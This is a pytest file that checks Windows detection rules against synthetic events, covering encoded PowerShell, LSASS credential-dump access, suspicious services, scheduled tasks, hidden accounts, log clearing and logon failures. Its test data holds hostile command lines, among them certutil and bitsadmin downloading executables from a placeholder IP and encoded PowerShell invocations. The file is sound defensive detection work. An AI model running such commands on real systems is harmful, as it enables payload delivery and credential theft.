"""Windows rules on SYNTHETIC events built in memory.

Public datasets hold no sample for some cases a rule must get right: benign
look-alikes (-ExecutionPolicy next to -enc), filters for legitimate tools that
never appear in lab captures, or a binary started from another drive. These
tests build such events in memory, with no file and no real system behind them.
They complement, and never replace, the public fixtures of cases.yaml.
"""

from __future__ import annotations

from datetime import datetime
from functools import cache

import pytest

from vigie.models import Event
from vigie.rules import RULES_DIR
from vigie.sigma.loader import load_rules
from vigie.timeutils import UTC

SYNTHETIC_TIME = datetime(2024, 1, 1, tzinfo=UTC)


@cache
def rule(title):
    (found,) = [r for r in load_rules(RULES_DIR).detections if r.meta.title == title]
    return found


def synthetic_event(source, event_id, **fields):
    return Event(
        timestamp=SYNTHETIC_TIME,
        source=source,
        event_id=event_id,
        fields={"EventID": str(event_id), **fields},
        origin="synthetic",
    )


def check(title, source, event_id, fields, expected):
    assert rule(title).matches(synthetic_event(source, event_id, **fields)) is expected


POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


@pytest.mark.parametrize(
    ("command_line", "expected"),
    [
        ("powershell.exe -EncodedCommand SQBFAFgA", True),
        ("powershell.exe -enc SQBFAFgA", True),
        ("powershell.exe -e SQBFAFgA", True),
        ("powershell.exe -ec SQBFAFgA", True),
        ("powershell.exe /enc SQBFAFgA", True),
        ("powershell.exe --enc SQBFAFgA", True),
        ("powershell.exe /-EncodedCommand SQBFAFgA", True),
        ("powershell.exe \u2013enc SQBFAFgA", True),
        ("powershell.exe\t-e\tSQBFAFgA", True),
        ("POWERSHELL.EXE -ENC SQBFAFgA", True),
        ("powershell.exe -ExecutionPolicy Bypass -File deploy.ps1", False),
        ("powershell.exe -ep bypass -NoProfile -c Get-Date", False),
        ("powershell.exe -c Get-Content a.txt -Encoding utf8", False),
        ("powershell.exe -c Get-Item x -ErrorAction SilentlyContinue", False),
        ("powershell.exe -c if ($a -eq 1) { exit }", False),
        ("powershell.exe -c [Convert]::FromBase64String('SQBFAFgA')", False),
    ],
)
def test_encoded_powershell_command_lines(command_line, expected):
    fields = {"Image": POWERSHELL, "CommandLine": command_line}
    check("PowerShell Encoded Command Execution", "sysmon", 1, fields, expected)


@pytest.mark.parametrize(
    ("source", "event_id", "fields", "expected"),
    [
        # A renamed copy is caught through Sysmon's OriginalFileName.
        (
            "sysmon",
            1,
            {
                "Image": r"C:\Temp\update.exe",
                "OriginalFileName": "PowerShell.EXE",
                "CommandLine": "update.exe -enc SQBFAFgA",
            },
            True,
        ),
        # Security 4688 names the image NewProcessName.
        (
            "security",
            4688,
            {"NewProcessName": POWERSHELL, "CommandLine": "powershell -enc AA"},
            True,
        ),
        # A cmd.exe wrapper carries the text but is not PowerShell itself.
        (
            "sysmon",
            1,
            {
                "Image": r"C:\Windows\System32\cmd.exe",
                "CommandLine": "cmd /c powershell -enc SQBFAFgA",
            },
            False,
        ),
        # The Azure Guest Configuration agent is filtered.
        (
            "sysmon",
            1,
            {
                "Image": POWERSHELL,
                "CommandLine": "powershell -enc SQBFAFgA",
                "ParentImage": r"C:\Packages\Plugins\Microsoft.GuestConfiguration"
                r".ConfigurationforWindows\1.0\gc_worker.exe",
            },
            False,
        ),
    ],
)
def test_encoded_powershell_images(source, event_id, fields, expected):
    check("PowerShell Encoded Command Execution", source, event_id, fields, expected)


LSASS = r"C:\Windows\system32\lsass.exe"


@pytest.mark.parametrize(
    ("source_image", "access", "expected"),
    [
        (r"C:\Tools\procdump64.exe", "0x1fffff", True),
        (r"C:\Tools\procdump64.exe", "0x1FFFFF", True),  # hexadecimal case does not matter
        (r"C:\Tools\procdump64.exe", "0x1000", False),  # QUERY_LIMITED_INFORMATION only
        (r"C:\Windows\System32\wininit.exe", "0x1fffff", False),
        (r"c:\windows\system32\csrss.exe", "0x1fffff", False),
        (r"D:\Windows\System32\wininit.exe", "0x1fffff", True),  # a trusted name on another volume
        (r"C:\Windows\System32\Taskmgr.exe", "0x1410", False),  # details view
        (r"C:\Windows\System32\Taskmgr.exe", "0x1fffff", True),  # "Create dump file"
        (r"C:\Windows\System32\wbem\WmiPrvSE.exe", "0x1410", False),
        (r"C:\Windows\System32\wbem\WmiPrvSE.exe", "0x1fffff", True),
        (
            r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1\MsMpEng.exe",
            "0x1fffff",
            False,
        ),
        (
            r"E:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1\MsMpEng.exe",
            "0x1fffff",
            True,
        ),
        (r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe", "0x1fffff", False),
        (r"C:\Windows\Sysmon64.exe", "0x1fffff", False),
    ],
)
def test_lsass_access_filters(source_image, access, expected):
    fields = {"TargetImage": LSASS, "GrantedAccess": access, "SourceImage": source_image}
    check("LSASS Memory Access With Credential Dumping Rights", "sysmon", 10, fields, expected)


SCM = {"Provider_Name": "Service Control Manager"}


@pytest.mark.parametrize(
    ("image_path", "expected"),
    [
        (r"%SystemRoot%\Temp\svc.exe", True),
        (r"%windir%\Temp\svc.exe", True),
        (r"%PUBLIC%\svc.exe", True),
        (r"\\127.0.0.1\ADMIN$\svc.exe", True),
        (r"\\.\pipe\foo", True),
        (r"cmd.exe /c echo abc > \\.\pipe\abc", True),
        (r"C:\ProgramData\x\renamed.exe -enc JABzAD0A", True),  # encoded PowerShell, renamed binary
        (r"C:\Windows\System32\svchost.exe -k netsvcs", False),
        (r'"C:\Program Files\Vendor\agent.exe" -e JSON', False),
        (r"%SystemRoot%\PSEXESVC.exe", False),  # left to the PsExec rule
        (r"\SystemRoot\System32\drivers\vendor.sys", False),
    ],
)
def test_suspicious_service_image_paths(image_path, expected):
    check(
        "Suspicious Service Installed", "system", 7045, {**SCM, "ImagePath": image_path}, expected
    )


@pytest.mark.parametrize(
    ("fields", "expected"),
    [
        (
            {"ServiceName": "PAExec-1234-HOST", "ImagePath": r"C:\Windows\PAExec-1234-HOST.exe"},
            True,
        ),
        ({"ServiceName": "RemComSvc", "ImagePath": r"C:\Windows\RemComSvc.exe"}, True),
        ({"ServiceName": "Spooler", "ImagePath": r"C:\Windows\System32\spoolsv.exe"}, False),
    ],
)
def test_psexec_like_services(fields, expected):
    check("PsExec-Like Service Installed", "system", 7045, {**SCM, **fields}, expected)


def task_xml(command, encoded=False):
    xml = f"<Task><Actions><Exec><Command>{command}</Command></Exec></Actions></Task>"
    return xml.replace("<", "&lt;").replace(">", "&gt;") if encoded else xml


@pytest.mark.parametrize("encoded", [False, True])
@pytest.mark.parametrize(
    ("command", "expected"),
    [
        (r"C:\Windows\System32\cmd.exe", True),
        ("%ComSpec%", True),
        ("powershell", True),
        (r"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\x.exe", True),
        (r"C:\Users\bob\OneDrive\Desktop\x.exe", True),
        (r"%SystemDrive%\Users\Public\x.exe", True),
        (r"%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe", False),
        (r"C:\Windows\System32\usoclient.exe", False),
        (r"C:\cmdtools\sync.exe", False),
        (r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1\MpCmdRun.exe", False),
        (
            r"%SystemDrive%\ProgramData\Microsoft\Windows Defender\Platform\4.18.1\MpCmdRun.exe",
            False,
        ),
    ],
)
def test_scheduled_task_commands(command, expected, encoded):
    fields = {"TaskContent": task_xml(command, encoded)}
    check("Suspicious Scheduled Task Created", "security", 4698, fields, expected)


@pytest.mark.parametrize(
    ("name", "expected"),
    [
        ("backdoor$", True),
        ("HomeGroupUser$", False),
        ("homegroupuser$", False),
        ("backdoor", False),
    ],
)
def test_hidden_user_names(name, expected):
    check("Hidden User Account Created", "security", 4720, {"TargetUserName": name}, expected)


@pytest.mark.parametrize(
    ("fields", "expected"),
    [
        ({"Provider_Name": "Microsoft-Windows-Eventlog"}, True),
        ({"Provider_Name": ""}, True),  # JSON exports without a provider name
        ({}, True),
        ({"Provider_Name": "Some-Other-Provider"}, False),
    ],
)
def test_security_log_cleared_providers(fields, expected):
    check("Security Event Log Cleared", "security", 1102, fields, expected)


@pytest.mark.parametrize(
    ("channel", "expected"),
    [("System", True), ("Microsoft-Windows-Sysmon/Operational", True), ("Application", False)],
)
def test_important_log_cleared_channels(channel, expected):
    fields = {"Provider_Name": "Microsoft-Windows-Eventlog", "Channel": channel}
    check("Important Windows Event Log Cleared", "system", 104, fields, expected)


@pytest.mark.parametrize(
    ("fields", "expected"),
    [
        ({"Status": "0xC000006D", "SubStatus": "0xC000006A", "TargetUserName": "alice"}, True),
        ({"Status": "0xC000006D", "SubStatus": "0xC0000064", "TargetUserName": "nobody"}, True),
        ({"Status": "0xC0000234", "SubStatus": "0x0", "TargetUserName": "alice"}, True),
        ({"Status": "0xC000006D", "SubStatus": "0xC0000072", "TargetUserName": "alice"}, False),
        ({"Status": "0xC000006D", "SubStatus": "0xC000006A", "TargetUserName": "HOST01$"}, False),
    ],
)
def test_failed_logon_status_codes(fields, expected):
    check("Windows Failed Logon", "security", 4625, fields, expected)


@pytest.mark.parametrize(
    ("event_id", "status", "expected"),
    [(4771, "0x18", True), (4768, "0x6", True), (4771, "0x12", False), (4768, "0x0", False)],
)
def test_kerberos_failure_codes(event_id, status, expected):
    fields = {"Status": status, "TargetUserName": "alice", "IpAddress": "192.0.2.5"}
    check("Kerberos Authentication Failure", "security", event_id, fields, expected)


@pytest.mark.parametrize(
    ("title", "image", "command_line", "expected"),
    [
        (
            "File Download Via Certutil",
            r"C:\Windows\System32\certutil.exe",
            "certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe",
            True,
        ),
        (
            "File Download Via Certutil",
            r"C:\Windows\System32\certutil.exe",
            "certutil -encode in.bin out.txt",
            False,
        ),
        (
            "File Download Via Bitsadmin",
            r"C:\Windows\System32\bitsadmin.exe",
            "bitsadmin /addfile job http://203.0.113.9/a.exe C:\\a.exe",
            True,
        ),
        (
            "File Download Via Bitsadmin",
            r"C:\Windows\System32\bitsadmin.exe",
            "bitsadmin /create job",
            False,
        ),
        (
            "File Download Via Desktopimgdownldr",
            r"C:\Windows\System32\desktopimgdownldr.exe",
            "desktopimgdownldr.exe /lockscreenurl:https://203.0.113.9/a.jpg /eventName:x",
            True,
        ),
    ],
)
def test_download_lolbins_in_security_4688(title, image, command_line, expected):
    fields = {"NewProcessName": image, "CommandLine": command_line}
    check(title, "security", 4688, fields, expected)
